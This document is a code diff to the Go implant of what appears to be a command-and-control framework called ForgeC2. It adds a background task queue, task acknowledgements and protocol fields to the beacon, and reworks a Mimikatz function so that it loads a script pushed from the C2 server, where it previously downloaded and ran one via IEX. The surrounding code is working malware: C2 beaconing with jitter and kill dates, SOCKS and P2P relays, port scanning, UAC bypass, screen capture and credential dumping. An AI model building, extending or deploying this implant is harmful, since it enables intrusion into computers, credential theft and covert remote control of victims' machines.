@@ -14,6 +14,8 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"image/jpeg"
+	"image/png"
 	"io"
 	"log"
 	mathRand "math/rand"
@@ -22,14 +24,12 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
 	"sync/atomic"
 	"time"
-	"image/jpeg"
-	"image/png"
-	"path/filepath"
 
 	"github.com/forgec2/forgec2/pkg/encoding"
 )
@@ -116,7 +116,7 @@ func init() {
 	if BeaconURI == "" {
 		BeaconURI = "/api/v1/beacon"
 	}
-	BeaconMethod = "POST"   // FORCE POST — GET with body is unreliable in Go's http client
+	BeaconMethod = "POST" // FORCE POST — GET with body is unreliable in Go's http client
 	BeaconTransport = BeaconTransportStr
 	if BeaconTransport == "" {
 		BeaconTransport = "http"
@@ -414,6 +414,7 @@ func main() {
 	}
 
 	// Main beacon loop
+	startTaskWorker()
 	beaconCount := 0
 	for {
 		// Kill date check: exit if expired
@@ -449,7 +450,7 @@ func main() {
 
 		// Deliver task results immediately instead of waiting a full sleep cycle.
 		pendingMu.Lock()
-		hasPending := len(pendingResults) > 0
+		hasPending := len(pendingResults) > 0 || len(pendingTaskAcks) > 0
 		pendingMu.Unlock()
 		if hasPending {
 			continue
@@ -513,7 +514,7 @@ func sleepWithJitter() {
 		if inFastMode.Load() {
 			d = 50 * time.Millisecond
 		}
-		time.Sleep(d)
+		waitForBeaconWake(d)
 		return
 	}
 	baseInterval := Interval
@@ -533,7 +534,16 @@ func sleepWithJitter() {
 		sleepObfuscated(base + variation)
 		return
 	}
-	time.Sleep(base + variation)
+	waitForBeaconWake(base + variation)
+}
+
+func waitForBeaconWake(duration time.Duration) {
+	timer := time.NewTimer(duration)
+	defer timer.Stop()
+	select {
+	case <-timer.C:
+	case <-beaconWake:
+	}
 }
 
 func checkFastMode(tasks []Task) {
@@ -591,6 +601,35 @@ func getUUIDFilePath() string {
 	return "/var/lib/dbus/machine-id"
 }
 
+func startTaskWorker() {
+	taskWorkerOnce.Do(func() {
+		go func() {
+			for task := range taskQueue {
+				result := executeTask(task)
+				pendingMu.Lock()
+				pendingResults = append(pendingResults, result)
+				pendingMu.Unlock()
+				inFastMode.Store(true)
+				select {
+				case beaconWake <- struct{}{}:
+				default:
+				}
+			}
+		}()
+	})
+}
+
+func enqueueTask(task Task) {
+	taskQueue <- task
+	pendingMu.Lock()
+	pendingTaskAcks = append(pendingTaskAcks, task.ID)
+	pendingMu.Unlock()
+}
+
+func availableTaskCapacity() int {
+	return cap(taskQueue) - len(taskQueue)
+}
+
 func doBeacon() {
 	info := getSystemInfo()
 
@@ -611,12 +650,16 @@ func doBeacon() {
 	p2pRelayMu.Lock()
 	relayedResults := make([]RelayedData, 0)
 	for _, childUUID := range p2pChildUUIDs {
-		if results, ok := p2pChildResults[childUUID]; ok && len(results) > 0 {
+		results := p2pChildResults[childUUID]
+		acks := p2pChildAcks[childUUID]
+		if len(results) > 0 || len(acks) > 0 {
 			relayedResults = append(relayedResults, RelayedData{
-				AgentID: childUUID,
-				Results: results,
+				AgentID:    childUUID,
+				Results:    results,
+				AckTaskIDs: acks,
 			})
 			delete(p2pChildResults, childUUID)
+			delete(p2pChildAcks, childUUID)
 		}
 	}
 	p2pRelayMu.Unlock()
@@ -644,15 +687,22 @@ func doBeacon() {
 
 	pendingMu.Lock()
 	resultsCopy := pendingResults
+	acksCopy := pendingTaskAcks
 	pendingResults = nil // sent
+	pendingTaskAcks = nil
 	pendingMu.Unlock()
 
+	taskCapacity := availableTaskCapacity()
 	req := BeaconRequest{
-		UUID:      agentUUID,
-		Info:      info,
-		Results:   resultsCopy,
-		SocksData: socksData,
-		Relayed:   relayedResults,
+		UUID:            agentUUID,
+		ProtocolVersion: CurrentProtocolVersion,
+		AgentVersion:    AgentVersion,
+		Info:            info,
+		Results:         resultsCopy,
+		AckTaskIDs:      acksCopy,
+		TaskCapacity:    &taskCapacity,
+		SocksData:       socksData,
+		Relayed:         relayedResults,
 	}
 
 	body, _ := json.Marshal(req)
@@ -759,6 +809,10 @@ func doBeacon() {
 		respBody = sendWithMode(sendBody)
 	}
 	if respBody == nil {
+		pendingMu.Lock()
+		pendingResults = append(resultsCopy, pendingResults...)
+		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
+		pendingMu.Unlock()
 		if Debug {
 			fmt.Println("[!] Beacon returned nil, skipping")
 		}
@@ -890,15 +944,9 @@ func doBeacon() {
 	}
 	socksRelayMu.Unlock()
 
-	pendingMu.Lock()
-	if cap(pendingResults) < len(resp.Tasks) {
-		pendingResults = make([]TaskResult, 0, len(resp.Tasks))
-	}
 	for _, task := range resp.Tasks {
-		result := executeTask(task)
-		pendingResults = append(pendingResults, result)
+		enqueueTask(task)
 	}
-	pendingMu.Unlock()
 }
 
 func sendToC2(idx int, body []byte) []byte {
@@ -1156,6 +1204,7 @@ func p2pCleanupStaleChildren() {
 				keep = append(keep, uuid)
 			} else {
 				delete(p2pChildResults, uuid)
+				delete(p2pChildAcks, uuid)
 				delete(p2pChildTasks, uuid)
 				delete(p2pChildLastSeen, uuid)
 			}
@@ -1257,7 +1306,7 @@ func sendScreenFrame(data []byte) {
 				Output: b64,
 			}},
 		}
-	body, _ := encodeBeacon(req)
+		body, _ := encodeBeacon(req)
 		if Protocol == "tcp" {
 			sendTCPBeacon(body)
 		} else {
@@ -1317,19 +1366,19 @@ func getSystemInfo() map[string]string {
 	integrity, elevated, domain := getPlatformSecurityInfo()
 
 	info := map[string]string{
-		"hostname":    hostnameB64,
-		"username":    usernameB64,
-		"os":          runtime.GOOS,
-		"arch":        runtime.GOARCH,
-		"ip":          ipB64,
-		"encoding":    "base64",
-		"listener_id": fmt.Sprintf("%d", ListenerID),
-		"version":     AgentVersion,
-		"pid":         strconv.Itoa(os.Getpid()),
-		"process_name": procName,
-		"integrity":   integrity,
-		"elevated":    strconv.FormatBool(elevated),
-		"domain":      domain,
+		"hostname":      hostnameB64,
+		"username":      usernameB64,
+		"os":            runtime.GOOS,
+		"arch":          runtime.GOARCH,
+		"ip":            ipB64,
+		"encoding":      "base64",
+		"listener_id":   fmt.Sprintf("%d", ListenerID),
+		"version":       AgentVersion,
+		"pid":           strconv.Itoa(os.Getpid()),
+		"process_name":  procName,
+		"integrity":     integrity,
+		"elevated":      strconv.FormatBool(elevated),
+		"domain":        domain,
 		"interval":      strconv.Itoa(Interval),
 		"jitter":        strconv.Itoa(Jitter),
 		"active_window": getActiveWindowTitle(),
@@ -1752,10 +1801,10 @@ func portScan(target string) (string, error) {
 	var results []string
 	for _, ip := range ips {
 		for _, port := range ports {
-		addr := net.JoinHostPort(strings.TrimSpace(ip), strings.TrimSpace(port))
-		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
-		if err == nil {
-			results = append(results, addr+" open")
+			addr := net.JoinHostPort(strings.TrimSpace(ip), strings.TrimSpace(port))
+			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
+			if err == nil {
+				results = append(results, addr+" open")
 				conn.Close()
 			} else {
 				results = append(results, addr+" closed")
@@ -1868,7 +1917,7 @@ func getAVSignatures() []string {
 }
 
 // elevate attempts UAC bypass / privilege escalation to run command elevated.
-	// Multiple methods for elevated UAC bypass (fodhelper, slui, etc.).
+// Multiple methods for elevated UAC bypass (fodhelper, slui, etc.).
 // cmd: the command to run elevated (default cmd.exe if empty)
 func elevate(cmd string) (string, error) {
 	if cmd == "" {
@@ -2016,20 +2065,56 @@ Write-Output ($results -join [string]::NewLine());
 	return out, nil
 }
 
-// ?? mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ???????
-func runMimikatz(command string) (string, error) {
+// runMimikatz runs a mimikatz command via a local Invoke-Mimikatz.ps1 only.
+// Remote IEX download is disabled for OPSEC.
+// Prefer order: task-provided base64 module → next to implant → TEMP → APPDATA modules.
+func runMimikatz(command string, moduleB64 string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
 	}
 	if command == "" {
 		command = s(SSekurlsaLogonpasswords)
 	}
+	scriptName := s(SInvokeMimikatz) + ".ps1"
+	localScript := filepath.Join(os.TempDir(), scriptName)
+
+	// Deploy module payload from C2 if provided
+	if moduleB64 != "" {
+		raw, err := base64.StdEncoding.DecodeString(moduleB64)
+		if err == nil && len(raw) > 0 {
+			if err := os.WriteFile(localScript, raw, 0600); err != nil {
+				return "", fmt.Errorf("%s: failed to write module script: %w", s(SMimikatz), err)
+			}
+		}
+	}
+
+	if _, err := os.Stat(localScript); err != nil {
+		candidates := []string{}
+		if exe, err := os.Executable(); err == nil {
+			candidates = append(candidates, filepath.Join(filepath.Dir(exe), scriptName))
+		}
+		if appData := os.Getenv("APPDATA"); appData != "" {
+			candidates = append(candidates, filepath.Join(appData, "ForgeC2", "modules", scriptName))
+		}
+		candidates = append(candidates, filepath.Join(os.TempDir(), scriptName))
+		found := false
+		for _, c := range candidates {
+			if _, err := os.Stat(c); err == nil {
+				localScript = c
+				found = true
+				break
+			}
+		}
+		if !found {
+			return "", fmt.Errorf("%s: local script not found (remote IEX disabled). Upload %s to server Modules store or place next to implant/TEMP. Command: %s", s(SMimikatz), scriptName, command)
+		}
+	}
+
+	// Escape single quotes in command for PowerShell single-quoted string
+	safeCmd := strings.ReplaceAll(command, "'", "''")
 	psCmd := fmt.Sprintf(
-		`$m = '%s';`+
-			`IEX(New-Object Net.WebClient).DownloadString('%s%s.ps1');`+
-			`$r = %s -Command $m;`+
-			`Write-Output $r`,
-		command, s(SPSDownloadURL), s(SInvokeMimikatz), s(SInvokeMimikatz))
+		`Import-Module '%s' -Force; $m = '%s'; $r = %s -Command $m; Write-Output $r`,
+		localScript, safeCmd, s(SInvokeMimikatz))
 	out, err := runShell(psCmd, "powershell.exe")
 	if err != nil {
 		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
@@ -2681,6 +2766,9 @@ func p2pHandleChild(conn net.Conn) {
 	p2pChildLastSeen[childID] = time.Now()
 	if len(req.Results) > 0 {
 		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
+	}
+	if len(req.AckTaskIDs) > 0 {
+		p2pChildAcks[childID] = append(p2pChildAcks[childID], req.AckTaskIDs...)
 	}
 	// Check if there are any pending tasks for this child
 	tasksForChild := p2pChildTasks[childID]
